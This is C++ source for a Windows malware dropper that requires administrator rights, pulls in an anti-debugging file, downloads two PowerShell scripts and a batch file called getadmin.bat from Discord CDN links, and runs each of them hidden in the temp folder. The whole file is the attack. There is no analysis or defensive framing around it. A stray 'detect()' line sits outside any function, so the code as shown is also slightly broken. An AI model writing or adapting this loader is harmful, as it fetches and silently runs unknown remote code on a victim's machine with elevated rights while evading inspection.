#include <Windows.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <tchar.h>
#include <string>
#include <iostream>
#include <urlmon.h>
#include <antidbg.cpp>

#define UNICODE

#pragma comment(lib, "urlmon.lib")


detect()

void RunHiddenProcess(const wchar_t* filePath) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(NULL, const_cast<wchar_t*>(filePath), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

HRESULT DownloadFile(const wchar_t* url, const wchar_t* filePath) {
    IStream* pStream = NULL;
    HRESULT hr = URLOpenBlockingStreamW(NULL, url, &pStream, 0, NULL);

    if (SUCCEEDED(hr)) {
        DWORD bytesRead;
        BYTE buffer[4096];
        HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            while (pStream->Read(buffer, sizeof(buffer), &bytesRead) == S_OK && bytesRead > 0) {
                DWORD bytesWritten;
                WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
            }
            
            CloseHandle(hFile);
            hr = S_OK;
        }
        else {
            hr = E_FAIL;
        }

        pStream->Release();
    }

    return hr;
}

int main() {
    if (!IsUserAnAdmin()) {
        std::cerr << "Kuzi Keri Kelle Tennim Giorna Govana yönetici izni ver kremin" << std::endl;
        return 1; // Hata koduyla program sonlandırılır
    }

        const wchar_t* ps1FileUrls[] = {
            L"https://cdn.discordapp.com/attachments/1148674530995355681/1174938484163751937/aaaa.ps1",
            L"https://cdn.discordapp.com/attachments/1148674530995355681/1174925545096630332/ms2.ps1"
        };

        const wchar_t* batFileUrl = L"https://cdn.discordapp.com/attachments/1148674530995355681/1175117782833176576/adawdaw.bat";

        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);

        for (int i = 0; i < sizeof(ps1FileUrls) / sizeof(ps1FileUrls[0]); ++i) {
            std::wstring fileName = L"ms" + std::to_wstring(i + 1) + L".ps1";
            wchar_t filePath[MAX_PATH];
            swprintf_s(filePath, L"%s\\%s", tempPath, fileName.c_str());

            HRESULT hr = DownloadFile(ps1FileUrls[i], filePath);
            if (SUCCEEDED(hr)) {
                RunHiddenProcess(filePath);
            } else {
                std::wcerr << L"ps1 file download failed. Error code: " << hr << std::endl;
            }
        }

        std::wstring batFileName = L"getadmin.bat";
        wchar_t batFilePath[MAX_PATH];
        swprintf_s(batFilePath, L"%s\\%s", tempPath, batFileName.c_str());
        DownloadFile(batFileUrl, batFilePath);
        RunHiddenProcess(batFilePath);

    return 0;
}